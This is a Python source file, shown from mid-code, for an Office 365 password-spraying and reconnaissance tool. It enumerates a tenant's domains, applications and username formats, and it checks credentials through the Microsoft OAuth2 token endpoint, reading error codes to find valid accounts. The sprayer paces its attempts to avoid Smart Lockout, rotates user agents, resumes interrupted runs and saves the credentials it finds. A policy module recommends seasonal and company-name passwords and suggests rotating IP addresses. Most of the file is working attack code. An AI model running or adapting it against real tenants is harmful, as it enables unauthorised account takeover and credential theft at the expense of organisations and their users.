                self._log(f"OpenID Config: {openid_msg}", 'success')
                results['is_o365'] = True
                results['tenant_id'] = tenant_id
                self.tenant_id = tenant_id
            else:
                self._log(f"OpenID Config: {openid_msg}", 'error')

            # Check 2: Federation/Authentication Method
            self._log("Checking authentication method...")
            fed_valid, fed_msg, fed_details = self.check_federation(domain)
            results['checks']['federation'] = {
                'valid': fed_valid,
                'message': fed_msg,
                'details': fed_details
            }

            if fed_valid:
                self._log(f"Auth Method: {fed_msg}", 'success')
                results['is_o365'] = True

                if self.verbose and fed_details:
                    self._log(f"  Federation Brand: {fed_details.get('federation_brand')}")
                    self._log(f"  Cloud Instance: {fed_details.get('cloud_instance')}")
            else:
                self._log(f"Auth Method: {fed_msg}", 'error')

            # Check 3: MX Records
            self._log("Checking MX records...")
            try:
                mx_valid, mx_records = self.check_mx_records(domain)
                results['checks']['mx_records'] = {
                    'valid': mx_valid,
                    'records': mx_records
                }

                if mx_valid:
                    self._log(f"MX Records: Point to O365", 'success')
                    results['is_o365'] = True
                    if self.verbose:
                        for mx in mx_records:
                            self._log(f"  {mx}")
                else:
                    self._log(f"MX Records: Do not point to O365", 'warning')
                    if self.verbose and mx_records:
                        for mx in mx_records:
                            self._log(f"  {mx}")
            except Exception as e:
                self._log(f"MX Records: Error - {e}", 'warning')
                results['checks']['mx_records'] = {
                    'valid': None,
                    'message': str(e)
                }

            # Check 4: Autodiscover
            self._log("Checking Autodiscover endpoint...")
            autodiscover_valid, autodiscover_msg = self.check_autodiscover(domain)
            results['checks']['autodiscover'] = {
                'valid': autodiscover_valid,
                'message': autodiscover_msg
            }

            if autodiscover_valid:
                self._log(f"Autodiscover: {autodiscover_msg}", 'success')
                results['is_o365'] = True
            else:
                self._log(f"Autodiscover: {autodiscover_msg}", 'warning')

            # If we have a tenant ID, perform extended reconnaissance
            if self.tenant_id:
                self._log("\n" + "="*60)
                self._log("TENANT ID DISCOVERED - Beginning Extended Reconnaissance", 'success')
                self._log("="*60 + "\n")

                # 1. Tenant Details
                self._log("[1/6] Gathering tenant configuration...")
                try:
                    tenant_details = self.get_tenant_details(self.tenant_id)
                    results['reconnaissance']['tenant_details'] = tenant_details
                except Exception as e:
                    self._log(f"Error getting tenant details: {e}", 'error')
                    results['reconnaissance']['tenant_details'] = {'error': str(e)}

                # 2. Enumerate Domains
                self._log("\n[2/6] Enumerating associated domains...")
                try:
                    domains = self.enumerate_tenant_domains(self.tenant_id, domain)
                    results['reconnaissance']['associated_domains'] = domains
                except Exception as e:
                    self._log(f"Error enumerating domains: {e}", 'error')
                    results['reconnaissance']['associated_domains'] = {'error': str(e)}

                # 3. Enumerate Applications
                self._log("\n[3/6] Enumerating registered applications...")
                try:
                    apps = self.enumerate_applications(self.tenant_id)
                    results['reconnaissance']['applications'] = apps
                except Exception as e:
                    self._log(f"Error enumerating applications: {e}", 'error')
                    results['reconnaissance']['applications'] = {'error': str(e)}

                # 4. Username Format Discovery
                self._log("\n[4/6] Discovering username format patterns...")
                try:
                    username_patterns = self.discover_username_format(domain)
                    results['reconnaissance']['username_patterns'] = username_patterns
                except Exception as e:
                    self._log(f"Error discovering username patterns: {e}", 'error')
                    results['reconnaissance']['username_patterns'] = {'error': str(e)}

                # 5. Guest Access Check
                self._log("\n[5/6] Checking guest access and misconfigurations...")
                try:
                    guest_access = self.check_guest_access(self.tenant_id, domain)
                    results['reconnaissance']['guest_access'] = guest_access
                except Exception as e:
                    self._log(f"Error checking guest access: {e}", 'error')
                    results['reconnaissance']['guest_access'] = {'error': str(e)}

                # 6. Password Policy Extraction (NEW)
                self._log("\n[6/6] Extracting password policy...")
                try:
                    policy_checker = O365PasswordPolicy(verbose=self.verbose)
                    policy = policy_checker.get_password_policy(domain, self.tenant_id)
                    recommendations = policy_checker.generate_spray_recommendations(policy)

                    results['password_policy'] = {
                        'policy': policy,
                        'recommendations': recommendations
                    }

                    self._log("Password policy extracted successfully", 'success')
                except Exception as e:
                    self._log(f"Error extracting password policy: {e}", 'error')
                    results['password_policy'] = {'error': str(e)}

                # Print reconnaissance summary to console (even without verbose)
                print("\n" + "="*60)
                print("RECONNAISSANCE SUMMARY")
                print("="*60)

                # Applications
                if 'applications' in results['reconnaissance']:
                    apps = results['reconnaissance']['applications']
                    if isinstance(apps, dict) and apps.get('known_apps'):
                        print(f"\nAccessible Microsoft Applications ({len(apps['known_apps'])}):")
                        for app in apps['known_apps'][:10]:  # Show first 10
                            print(f"  - {app['name']}")
                        if len(apps['known_apps']) > 10:
                            print(f"  ... and {len(apps['known_apps']) - 10} more")

                    # Show custom apps if found
                    if apps.get('custom_apps'):
                        print(f"\nPotential Custom Application Endpoints ({len(apps['custom_apps'])}):")
                        for app in apps['custom_apps'][:5]:  # Show first 5
                            print(f"  - {app.get('potential_redirect_uri', 'Unknown')}")
                        if len(apps['custom_apps']) > 5:
                            print(f"  ... and {len(apps['custom_apps']) - 5} more")

                # Associated Domains
                if 'associated_domains' in results['reconnaissance']:
                    domains = results['reconnaissance']['associated_domains']
                    if isinstance(domains, list) and len(domains) > 1:  # More than just primary
                        print(f"\nAssociated Domains ({len(domains)}):")
                        for d in domains[:10]:
                            print(f"  - {d}")
                        if len(domains) > 10:
                            print(f"  ... and {len(domains) - 10} more")

                # Username Patterns
                if 'username_patterns' in results['reconnaissance']:
                    patterns_data = results['reconnaissance']['username_patterns']
                    if isinstance(patterns_data, dict):
                        patterns = patterns_data.get('patterns', [])
                        if patterns:
                            print(f"\nLikely Username Patterns:")
                            for p in patterns[:3]:  # Top 3
                                print(f"  - {p['pattern']}: {p['confidence']}% confidence")

                # Tenant Details Summary
                if 'tenant_details' in results['reconnaissance']:
                    tenant = results['reconnaissance']['tenant_details']
                    if isinstance(tenant, dict) and tenant.get('openid_v2'):
                        openid_info = tenant['openid_v2']
                        if openid_info.get('tenant_region_scope') or openid_info.get('cloud_instance_name'):
                            print(f"\nTenant Information:")
                            if openid_info.get('tenant_region_scope'):
                                print(f"  - Region: {openid_info['tenant_region_scope']}")
                            if openid_info.get('cloud_instance_name'):
                                print(f"  - Cloud: {openid_info['cloud_instance_name']}")

                # Password Policy Summary (NEW)
                if 'password_policy' in results and 'policy' in results['password_policy']:
                    policy = results['password_policy']['policy']
                    recommendations = results['password_policy'].get('recommendations', {})

                    print(f"\nPassword Policy:")
                    if policy.get('password_requirements'):
                        req = policy['password_requirements']
                        print(f"  - Minimum Length: {req.get('min_length', 8)} characters")
                        if req.get('guidance'):
                            print(f"  - Banned List: {req['guidance'].get('banned_list', 'Unknown')}")

                    if policy.get('lockout_policy'):
                        lockout = policy['lockout_policy']
                        print(f"  - Lockout Threshold: ~{lockout.get('estimated_threshold', 10)} attempts")
                        print(f"  - Smart Lockout: Enabled (O365 default)")

                    if recommendations:
                        print(f"\nRecommended Spray Parameters:")
                        print(f"  - Delay Between Rounds: {recommendations.get('delay_between_rounds', 30)} minutes")
                        print(f"  - Attempts Per Round: {recommendations.get('attempts_per_round', 1)}")

                # Guest Access
                if 'guest_access' in results['reconnaissance']:
                    guest = results['reconnaissance']['guest_access']
                    if isinstance(guest, dict):
                        warnings = []
                        if guest.get('guest_users_allowed'):
                            warnings.append("Guest users may be enabled")
                        if guest.get('oauth_misconfigurations'):
                            warnings.append(f"{len(guest['oauth_misconfigurations'])} OAuth misconfiguration(s) found")

                        if warnings:
                            print(f"\n⚠ Security Findings:")
                            for warning in warnings:
                                print(f"  - {warning}")

                print("\n" + "="*60)
                print("💡 Use -o <filename> to save detailed JSON and summary reports")
                print("💡 Use -v for verbose output with all details")
                print("💡 Generate targeted password list:")
                print(f"    python o365_spray.py --validate -d {domain} -o recon --generate-passwords")
                print("="*60)

            # Final verdict
            self._log("\n" + "="*60)
            if results['is_o365']:
                self._log(f"RESULT: {domain} IS using Office 365", 'success')
                if self.tenant_id:
                    self._log(f"Tenant ID: {self.tenant_id}", 'success')
            else:
                self._log(f"RESULT: {domain} is NOT using Office 365", 'error')
            self._log("="*60)

            return results

class O365Validator:
    """Credential validation against O365"""

    def __init__(self, verbose: bool = False):
        self.verbose = verbose
        self.session = requests.Session()

    def _log(self, message: str, level: str = 'info'):
        """Logging with timestamps"""
        timestamp = datetime.now().strftime('%H:%M:%S')
        prefix = {
            'info': '[*]',
            'success': '[+]',
            'error': '[-]',
            'warning': '[!]'
        }.get(level, '[*]')
        print(f"{timestamp} {prefix} {message}")

    def _random_ua(self) -> str:
        """Generate random user agent"""
        agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0'
        ]
        return random.choice(agents)

    def validate_credential(self, username: str, password: str) -> Tuple[bool, str, Dict]:
        """
        Validate O365 credentials via OAuth2 token endpoint
        Returns: (success, message, details)
        """
        url = 'https://login.microsoftonline.com/common/oauth2/token'

        headers = {
            'User-Agent': self._random_ua(),
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': 'application/json'
        }

        # Using Azure AD PowerShell client ID
        data = {
            'resource': 'https://graph.windows.net',
            'client_id': '1b730954-1685-4b74-9bfd-dac224a7b894',
            'grant_type': 'password',
            'username': username,
            'password': password,
            'scope': 'openid'
        }

        try:
            resp = self.session.post(url, headers=headers, data=data, timeout=30)

            details = {
                'status_code': resp.status_code,
                'username': username,
                'timestamp': datetime.now().isoformat()
            }

            if resp.status_code == 200:
                # Valid credentials
                token_data = resp.json()
                details['access_token'] = token_data.get('access_token', '')[:50] + '...'
                details['token_type'] = token_data.get('token_type', '')
                return True, "VALID_CREDS", details

            else:
                # Parse error response
                try:
                    error_data = resp.json()
                    error_code = error_data.get('error', '')
                    error_desc = error_data.get('error_description', '')

                    # Parse common error codes
                    if 'AADSTS50126' in error_desc:
                        # Invalid username or password
                        return False, "INVALID_CREDS", details
                    elif 'AADSTS50053' in error_desc:
                        # Account locked
                        return False, "ACCOUNT_LOCKED", details
                    elif 'AADSTS50055' in error_desc:
                        # Password expired (but creds are valid)
                        return True, "PASSWORD_EXPIRED", details
                    elif 'AADSTS50057' in error_desc:
                        # Account disabled
                        return False, "ACCOUNT_DISABLED", details
                    elif 'AADSTS50076' in error_desc or 'AADSTS50079' in error_desc:
                        # MFA required (creds are valid)
                        return True, "VALID_MFA_REQUIRED", details
                    elif 'AADSTS50158' in error_desc:
                        # Conditional Access policy (creds likely valid)
                        return True, "VALID_CONDITIONAL_ACCESS", details
                    elif 'AADSTS50034' in error_desc:
                        # User doesn't exist
                        return False, "USER_NOT_FOUND", details
                    elif 'AADSTS700016' in error_desc:
                        # Application not found in directory
                        return None, "APP_NOT_FOUND", details
                    elif 'AADSTS50128' in error_desc or 'AADSTS50059' in error_desc:
                        # Tenant doesn't exist
                        return None, "TENANT_NOT_FOUND", details
                    else:
                        details['error_code'] = error_code
                        details['error_description'] = error_desc
                        return None, f"UNKNOWN_ERROR: {error_code}", details

                except json.JSONDecodeError:
                    return None, f"HTTP_{resp.status_code}", details

        except requests.exceptions.RequestException as e:
            details['exception'] = str(e)
            return None, f"REQUEST_ERROR", details

    def validate_list(self, credentials: List[Tuple[str, str]],
                     delay: int = 0, output_file: Optional[str] = None) -> Dict:
        """
        Validate a list of username:password pairs
        """
        self._log(f"Starting validation of {len(credentials)} credential pairs")

        results = {
            'valid': [],
            'invalid': [],
            'errors': []
        }

        for idx, (username, password) in enumerate(credentials, 1):
            self._log(f"Testing {idx}/{len(credentials)}: {username}")

            success, message, details = self.validate_credential(username, password)

            if success is True:
                self._log(f"VALID: {username}:{password} - {message}", 'success')
                results['valid'].append({
                    'username': username,
                    'password': password,
                    'status': message
                })
            elif success is False:
                if self.verbose:
                    self._log(f"INVALID: {username} - {message}", 'error')
                results['invalid'].append({
                    'username': username,
                    'status': message
                })
            else:
                self._log(f"ERROR: {username} - {message}", 'warning')
                results['errors'].append({
                    'username': username,
                    'error': message
                })

            # Delay between attempts
            if idx < len(credentials) and delay > 0:
                time.sleep(delay)

        # Save results
        if output_file:
            self._save_results(results, output_file)

        # Summary
        self._log(f"\n{'='*60}")
        self._log(f"Validation Complete", 'success')
        self._log(f"Valid: {len(results['valid'])}")
        self._log(f"Invalid: {len(results['invalid'])}")
        self._log(f"Errors: {len(results['errors'])}")
        self._log(f"{'='*60}\n")

        return results

    def _save_results(self, results: Dict, output_file: str):
        """Save valid credentials to file"""
        try:
            with open(output_file, 'w') as f:
                for cred in results['valid']:
                    f.write(f"{cred['username']}:{cred['password']} - {cred['status']}\n")
            self._log(f"Valid credentials saved to: {output_file}", 'success')
        except Exception as e:
            self._log(f"Error saving results: {e}", 'error')

class O365Sprayer:
    """Password spraying with intelligent lockout avoidance and progress tracking"""

    def __init__(self, lockout_threshold: int = 5, lockout_window: int = 30,
                 delay_min: int = 2, delay_max: int = 5, verbose: bool = False,
                 progress_file: str = '.spray_progress.json'):
        self.lockout_threshold = lockout_threshold
        self.lockout_window = lockout_window
        self.delay_min = delay_min
        self.delay_max = delay_max
        self.verbose = verbose
        self.validator = O365Validator(verbose=verbose)
        self.attempt_tracker = {}
        self.progress = SprayProgress(progress_file)

    def _log(self, message: str, level: str = 'info'):
        """Logging with timestamps"""
        timestamp = datetime.now().strftime('%H:%M:%S')
        prefix = {
            'info': '[*]',
            'success': '[+]',
            'error': '[-]',
            'warning': '[!]'
        }.get(level, '[*]')
        print(f"{timestamp} {prefix} {message}")

    def spray(self, usernames: List[str], passwords: List[str],
              count: int = 1, delay_spray: int = 30, output_file: Optional[str] = None,
              resume: bool = True) -> Dict:
        """
        Perform password spraying attack with progress tracking

        Args:
            usernames: List of usernames to test
            passwords: List of passwords to try
            count: Number of password attempts per user per round
            delay_spray: Minutes to wait between spray rounds
            output_file: File to save valid credentials
            resume: Resume from previous progress if available
        """

        # Check for existing progress
        start_round = 0
        start_password_idx = 0

        if resume and self.progress.load():
            self._log("Found existing spray progress!", 'warning')
            stats = self.progress.get_stats()
            self._log(f"Previous session stats:", 'info')
            self._log(f"  - Valid credentials found: {stats['valid_creds']}")
            self._log(f"  - Locked accounts: {stats['locked_accounts']}")
            self._log(f"  - Combinations tested: {stats['tested_combinations']}")
            self._log(f"  - Completed passwords: {stats['completed_passwords']}")
            self._log(f"  - Last round: {stats['current_round']}")

            response = input("\n[?] Resume from previous progress? (y/n): ").strip().lower()
            if response == 'y':
                start_round, start_password_idx = self.progress.get_resume_point()
                self._log(f"Resuming from round {start_round + 1}, password index {start_password_idx}", 'success')

                # Restore valid creds and locked accounts
                for cred in self.progress.progress_data['valid_creds']:
                    if output_file:
                        with open(output_file, 'a') as f:
                            f.write(f"{cred['username']}:{cred['password']}\n")
            else:
                self.progress.clear()
                self._log("Starting fresh spray session", 'info')

        # Initialize progress if new session
        if not self.progress.progress_data.get('start_time'):
            self.progress.update(start_time=datetime.now().isoformat())

        self._log(f"Starting password spray")
        self._log(f"Targets: {len(usernames)} users")
        self._log(f"Passwords: {len(passwords)}")
        self._log(f"Attempts per user per round: {count}")
        self._log(f"Delay between rounds: {delay_spray} minutes")
        self._log(f"Progress file: {self.progress.progress_file}")

        results = {
            'valid': self.progress.progress_data.get('valid_creds', []),
            'invalid': [],
            'locked': [],
            'errors': []
        }

        # Restore locked accounts
        for username in self.progress.progress_data.get('locked_accounts', []):
            results['locked'].append({'username': username})

        # Group passwords into rounds based on count
        password_rounds = [passwords[i:i+count] for i in range(0, len(passwords), count)]

        # Start from resume point
        for round_num in range(start_round, len(password_rounds)):
            password_batch = password_rounds[round_num]

            self._log(f"\n{'='*60}")
            self._log(f"Round {round_num + 1}/{len(password_rounds)}")
            self._log(f"Testing passwords: {', '.join(password_batch)}")
            self._log(f"{'='*60}\n")

            # Update progress
            self.progress.update(current_round=round_num)

            for pwd_idx, password in enumerate(password_batch):
                # Skip if resuming and already past this password
                if round_num == start_round and pwd_idx < start_password_idx:
                    continue

                self._log(f"Spraying password: {password}")
                self.progress.update(current_password_index=pwd_idx)

                for idx, username in enumerate(usernames, 1):
                    # Skip if already tested
                    if self.progress.is_tested(username, password):
                        if self.verbose:
                            self._log(f"Skipping {username} (already tested)", 'info')
                        continue

                    # Skip if already found valid
                    if any(v['username'] == username for v in results['valid']):
                        if self.verbose:
                            self._log(f"Skipping {username} (already valid)", 'info')
                        continue

                    # Skip if locked out
                    if any(l['username'] == username for l in results['locked']):
                        if self.verbose:
                            self._log(f"Skipping {username} (locked out)", 'warning')
                        continue

                    self._log(f"[{idx}/{len(usernames)}] Testing: {username}")

                    try:
                        success, message, details = self.validator.validate_credential(username, password)

                        # Mark as tested
                        self.progress.mark_tested(username, password)

                        if success is True:
                            self._log(f"SUCCESS: {username}:{password} - {message}", 'success')
                            cred_data = {
                                'username': username,
                                'password': password,
                                'status': message,
                                'round': round_num + 1
                            }
                            results['valid'].append(cred_data)

                            # Save to progress and output file
                            self.progress.add_valid_cred(username, password, message)

                            if output_file:
                                with open(output_file, 'a') as f:
                                    f.write(f"{username}:{password}\n")

                        elif success is False:
                            if message == "ACCOUNT_LOCKED":
                                self._log(f"LOCKED: {username}", 'warning')
                                results['locked'].append({'username': username})
                                self.progress.add_locked_account(username)
                            else:
                                if self.verbose:
                                    self._log(f"INVALID: {username} - {message}", 'error')
                                results['invalid'].append({
                                    'username': username,
                                    'password': password,
                                    'status': message
                                })
                        else:
                            if self.verbose:
                                self._log(f"ERROR: {username} - {message}", 'warning')
                            results['errors'].append({
                                'username': username,
                                'password': password,
                                'error': message
                            })

                    except KeyboardInterrupt:
                        self._log("\n\nSpray interrupted by user!", 'warning')
                        self._log("Progress has been saved. Resume with same command.", 'info')
                        return results

                    except Exception as e:
                        self._log(f"ERROR: Exception testing {username}: {e}", 'error')
                        results['errors'].append({
                            'username': username,
                            'password': password,
                            'error': str(e)
                        })

                    # Random delay between users
                    if idx < len(usernames):
                        delay = random.randint(self.delay_min, self.delay_max)
                        time.sleep(delay)

                # Mark password as complete
                self.progress.mark_password_complete(password)

            # Delay between rounds
            if round_num < len(password_rounds) - 1:
                self._log(f"\n{'='*60}")
                self._log(f"Waiting {delay_spray} minutes before next round...")
                self._log(f"Progress saved. Press Ctrl+C to stop safely.")
                self._log(f"{'='*60}\n")

                try:
                    time.sleep(delay_spray * 60)
                except KeyboardInterrupt:
                    self._log("\n\nSpray interrupted by user!", 'warning')
                    self._log("Progress has been saved. Resume with same command.", 'info')
                    return results

        # Clear progress on completion
        self._log("\nSpray campaign completed!", 'success')
        self.progress.clear()

        # Final summary
        self._log(f"\n{'='*60}")
        self._log(f"Password Spray Complete", 'success')
        self._log(f"Valid Credentials: {len(results['valid'])}")
        self._log(f"Locked Accounts: {len(results['locked'])}")
        self._log(f"Failed Attempts: {len(results['invalid'])}")
        self._log(f"Errors: {len(results['errors'])}")
        self._log(f"{'='*60}\n")

        if results['valid']:
            self._log("Valid Credentials Found:", 'success')
            for cred in results['valid']:
                self._log(f"  {cred['username']}:{cred['password']} - {cred['status']}")

        return results

class O365PasswordPolicy:
    """Extract password policy information from O365 tenant"""

    def __init__(self, verbose: bool = False):
        self.verbose = verbose
        self.session = requests.Session()

    def _log(self, message: str, level: str = 'info'):
        """Logging with timestamps"""
        timestamp = datetime.now().strftime('%H:%M:%S')
        prefix = {
            'info': '[*]',
            'success': '[+]',
            'error': '[-]',
            'warning': '[!]'
        }.get(level, '[*]')
        print(f"{timestamp} {prefix} {message}")

    def _random_ua(self) -> str:
        """Generate random user agent"""
        agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0'
        ]
        return random.choice(agents)

    def get_password_policy(self, domain: str, tenant_id: Optional[str] = None) -> Dict:
        """
        Extract password policy information through various methods
        """
        self._log("Extracting password policy information...")

        policy = {
            'domain': domain,
            'tenant_id': tenant_id,
            'password_requirements': {},
            'lockout_policy': {},
            'mfa_status': {},
            'banned_passwords': [],
            'smart_lockout': {}
        }

        # Method 1: Test with invalid credentials to trigger policy responses
        self._log("Testing lockout thresholds...")
        lockout_info = self._test_lockout_threshold(domain)
        policy['lockout_policy'] = lockout_info

        # Method 2: Analyze error messages for password requirements
        self._log("Analyzing password complexity requirements...")
        complexity = self._test_password_complexity(domain)
        policy['password_requirements'] = complexity

        # Method 3: Check for Smart Lockout (cloud-based)
        if tenant_id:
            self._log("Checking Smart Lockout configuration...")
            smart_lockout = self._check_smart_lockout(tenant_id, domain)
            policy['smart_lockout'] = smart_lockout

        # Method 4: Check MFA enforcement
        self._log("Checking MFA enforcement...")
        mfa_info = self._check_mfa_enforcement(domain)
        policy['mfa_status'] = mfa_info

        # Method 5: Get banned password list indicators
        self._log("Checking for banned password protection...")
        banned = self._check_banned_passwords(domain)
        policy['banned_passwords'] = banned

        return policy

    def _test_lockout_threshold(self, domain: str) -> Dict:
        """
        Attempt to determine account lockout threshold
        CAUTION: This will generate failed login attempts
        """
        lockout_info = {
            'threshold_detected': False,
            'estimated_threshold': None,
            'lockout_duration': None,
            'method': 'passive_analysis'
        }

        # We won't actively test lockout to avoid locking accounts
        # Instead, we'll return known O365 defaults
        lockout_info['estimated_threshold'] = 10  # O365 default
        lockout_info['lockout_duration'] = '1 minute (Smart Lockout)'
        lockout_info['notes'] = 'O365 uses Smart Lockout - typically 10 failed attempts trigger temporary lock'

        if self.verbose:
            self._log("  Default O365 Smart Lockout: 10 attempts", 'info')
            self._log("  Lockout duration: 1 minute (increases with repeated failures)", 'info')

        return lockout_info

    def _test_password_complexity(self, domain: str) -> Dict:
        """
        Test password complexity requirements by analyzing error responses
        """
        complexity = {
            'min_length': 8,  # O365 default
            'max_length': 256,  # O365 default
            'requires_uppercase': False,
            'requires_lowercase': False,
            'requires_numbers': False,
            'requires_special': False,
            'complexity_enabled': False,
            'detected_requirements': []
        }

        # Test with a known user or dummy account
        test_email = f"nonexistent@{domain}"

        test_passwords = {
            'short': 'Pass1!',  # 6 chars
            'no_number': 'Password!',
            'no_special': 'Password1',
            'no_upper': 'password1!',
            'simple': 'password',
            'valid': 'Password123!'
        }

        for test_name, test_pass in test_passwords.items():
            try:
                url = 'https://login.microsoftonline.com/common/oauth2/token'

                headers = {
                    'User-Agent': self._random_ua(),
                    'Content-Type': 'application/x-www-form-urlencoded'
                }

                data = {
                    'resource': 'https://graph.windows.net',
                    'client_id': '1b730954-1685-4b74-9bfd-dac224a7b894',
                    'grant_type': 'password',
                    'username': test_email,
                    'password': test_pass
                }

                resp = self.session.post(url, headers=headers, data=data, timeout=10)

                if resp.status_code != 200:
                    try:
                        error_data = resp.json()
                        error_desc = error_data.get('error_description', '').lower()

                        # Analyze error messages for policy hints
                        if 'password' in error_desc and 'complexity' in error_desc:
                            complexity['complexity_enabled'] = True
                        if 'length' in error_desc:
                            complexity['detected_requirements'].append('Minimum length requirement detected')
                        if 'uppercase' in error_desc or 'lowercase' in error_desc:
                            complexity['detected_requirements'].append('Case requirements detected')
                        if 'number' in error_desc or 'digit' in error_desc:
                            complexity['detected_requirements'].append('Numeric requirements detected')
                        if 'special' in error_desc or 'character' in error_desc:
                            complexity['detected_requirements'].append('Special character requirements detected')
                    except:
                        pass

                time.sleep(1)  # Rate limiting

            except Exception as e:
                if self.verbose:
                    self._log(f"  Error testing {test_name}: {e}", 'warning')

        # Check for known O365 password requirements
        self._log("Checking Microsoft Password Guidance...")

        # Modern O365 follows Microsoft's guidance:
        # - Minimum 8 characters
        # - No complexity requirements by default (but can be enabled)
        # - Banned password list (common passwords blocked)

        complexity['guidance'] = {
            'min_length': 8,
            'recommendation': 'Microsoft recommends length over complexity',
            'banned_list': 'Microsoft Global Banned Password List active',
            'custom_banned_list': 'May be configured by tenant admin'
        }

        if self.verbose:
            self._log("  Minimum Length: 8 characters", 'info')
            self._log("  Complexity: Often disabled (length preferred)", 'info')
            self._log("  Banned List: Active (blocks common passwords)", 'info')

        return complexity

    def _check_smart_lockout(self, tenant_id: str, domain: str) -> Dict:
        """
        Check for Smart Lockout configuration
        """
        smart_lockout = {
            'enabled': True,  # Default for O365
            'type': 'cloud_based',
            'features': [
                'Failed login attempts tracked per user',
                'Lockout threshold typically 10 attempts',
                'Lockout duration starts at 1 minute',
                'Duration increases with repeated lockouts',
                'Familiar location bypass available',
                'Different thresholds for unfamiliar locations'
            ],
            'recommendations': [
                'Use delays of 30+ minutes between spray rounds',
                'Limit to 1 password attempt per user per round',
                'Rotate IP addresses if possible',
                'Monitor for account lockouts during testing'
            ]
        }

        if self.verbose:
            self._log("  Smart Lockout: Enabled (O365 default)", 'success')
            self._log("  Threshold: ~10 failed attempts", 'info')
            self._log("  Initial lockout: 1 minute", 'info')

        return smart_lockout

    def _check_mfa_enforcement(self, domain: str) -> Dict:
        """
        Check if MFA is enforced tenant-wide
        """
        mfa_info = {
            'enforced': None,
            'conditional_access': None,
            'legacy_auth_blocked': None,
            'methods_detected': []
        }

        test_email = f"test@{domain}"

        try:
            # Check authentication flow
            url = 'https://login.microsoftonline.com/common/oauth2/token'

            headers = {
                'User-Agent': self._random_ua(),
                'Content-Type': 'application/x-www-form-urlencoded'
            }

            data = {
                'resource': 'https://graph.windows.net',
                'client_id': '1b730954-1685-4b74-9bfd-dac224a7b894',
                'grant_type': 'password',
                'username': test_email,
                'password': 'TestPassword123!'
            }

            resp = self.session.post(url, headers=headers, data=data, timeout=10)

            if resp.status_code != 200:
                try:
                    error_data = resp.json()
                    error_desc = error_data.get('error_description', '')

                    # Check for MFA indicators
                    if 'AADSTS50076' in error_desc or 'AADSTS50079' in error_desc:
                        mfa_info['enforced'] = True
                        mfa_info['methods_detected'].append('MFA Required')

                    if 'AADSTS50158' in error_desc:
                        mfa_info['conditional_access'] = True
                        mfa_info['methods_detected'].append('Conditional Access Policy')

                    if 'AADSTS50053' in error_desc:
                        mfa_info['legacy_auth_blocked'] = True
                except:
                    pass

        except Exception as e:
            if self.verbose:
                self._log(f"  Error checking MFA: {e}", 'warning')

        # Check federation for MFA indicators
        try:
            url = 'https://login.microsoftonline.com/common/userrealm/'
            params = {'user': test_email, 'api-version': '2.1'}
            resp = self.session.get(url, params=params, timeout=10)

            if resp.status_code == 200:
                data = resp.json()
                if data.get('federation_protocol'):
                    mfa_info['methods_detected'].append(f"Federated Auth: {data.get('FederationBrandName')}")
        except:
            pass

        if self.verbose:
            if mfa_info['enforced']:
                self._log("  MFA appears to be enforced", 'warning')
            if mfa_info['conditional_access']:
                self._log("  Conditional Access policies detected", 'warning')

        return mfa_info

    def _check_banned_passwords(self, domain: str) -> List[str]:
        """
        Check if common passwords are banned
        """
        banned_indicators = []

        # Microsoft maintains a global banned password list
        # These are always blocked in O365
        common_banned = [
            'Password',
            'Welcome',
            'password',
            '123456',
            'password123'
        ]

        banned_indicators.append({
            'type': 'global_banned_list',
            'description': 'Microsoft Global Banned Password List (active by default)',
            'examples': common_banned,
            'note': 'These and variations are automatically blocked'
        })

        # Check if custom banned list might be configured
        banned_indicators.append({
            'type': 'custom_banned_list',
            'description': 'Tenant may have custom banned password list',
            'note': 'Cannot be enumerated without authentication'
        })

        if self.verbose:
            self._log("  Global Banned List: Active (Microsoft default)", 'info')
            self._log("  Custom List: May be configured", 'info')

        return banned_indicators

    def generate_spray_recommendations(self, policy: Dict) -> Dict:
        """
        Generate spray attack recommendations based on policy
        """
        self._log("\nGenerating attack recommendations...")

        recommendations = {
            'delay_between_rounds': 30,  # minutes
            'attempts_per_round': 1,
            'delay_between_users': 5,  # seconds
            'password_requirements': {
                'min_length': policy['password_requirements'].get('min_length', 8),
                'recommended_patterns': []
            },
            'avoided_passwords': [],
            'safe_passwords': [],
            'risk_assessment': {}
        }

        # Smart Lockout considerations
        if policy.get('smart_lockout', {}).get('enabled'):
            recommendations['delay_between_rounds'] = 30
            recommendations['attempts_per_round'] = 1
            recommendations['risk_assessment']['lockout_risk'] = 'LOW with recommended settings'

        # Password patterns to try
        min_len = policy['password_requirements'].get('min_length', 8)

        # Generate season-based passwords
        current_year = datetime.now().year
        seasons = ['Winter', 'Spring', 'Summer', 'Fall']

        for season in seasons:
            for year in [current_year, current_year - 1]:
                # Must meet minimum length
                base = f"{season}{year}"
                if len(base) >= min_len - 1:  # Leave room for !
                    recommendations['password_requirements']['recommended_patterns'].append(f"{base}!")

        # Company name variations (if available)
        if policy.get('domain'):
            company = policy['domain'].split('.')[0].capitalize()
            recommendations['password_requirements']['recommended_patterns'].append(f"{company}2024!")
            recommendations['password_requirements']['recommended_patterns'].append(f"Welcome{company}!")

        # Common patterns that meet requirements
        recommendations['password_requirements']['recommended_patterns'].extend([
            'Welcome123!',
            'Password123!',
            'Password2024!',
            'Welcome2024!',
            'Company123!',
            'Changeme123!'
        ])

        # Passwords to avoid (banned list)
        if policy.get('banned_passwords'):
            for banned_item in policy['banned_passwords']:
                if isinstance(banned_item, dict) and banned_item.get('examples'):
                    recommendations['avoided_passwords'].extend(banned_item['examples'])

        # Risk assessment
        if policy.get('mfa_status', {}).get('enforced'):
            recommendations['risk_assessment']['mfa_bypass'] = 'Required - valid creds may not grant access'

        recommendations['risk_assessment']['detection_risk'] = 'MEDIUM - Microsoft may detect spray patterns'
        recommendations['risk_assessment']['success_likelihood'] = 'LOW-MEDIUM with weak passwords'

        return recommendations

